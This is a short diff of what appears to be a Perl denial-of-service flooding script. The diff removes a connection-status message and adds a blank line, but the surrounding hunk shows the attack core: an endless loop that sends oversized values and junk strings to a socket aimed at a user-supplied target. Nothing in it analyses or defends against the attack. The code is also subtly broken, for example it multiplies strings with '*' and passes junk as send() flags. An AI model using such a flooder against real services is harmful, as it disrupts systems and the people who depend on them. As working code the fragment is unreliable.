@@ -37,7 +37,6 @@ if(!defined $check && $check){
 	print("\n[!] Error: Please Check Your Internet Connection !!!");
 	exit(1);
 }
-print("\n[+] Internet Status[ Connected ]\n");
 $check->close();
 
 # INPUT TARGET INFO ==============================================
@@ -90,6 +89,7 @@ while (1) {
   send($sock, $size*9999999999999,$size*9999999999999);
   send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*3)
 }
+
 ##############################################################
 #####################                #########################
 #####################  END OF SCRIPT #########################
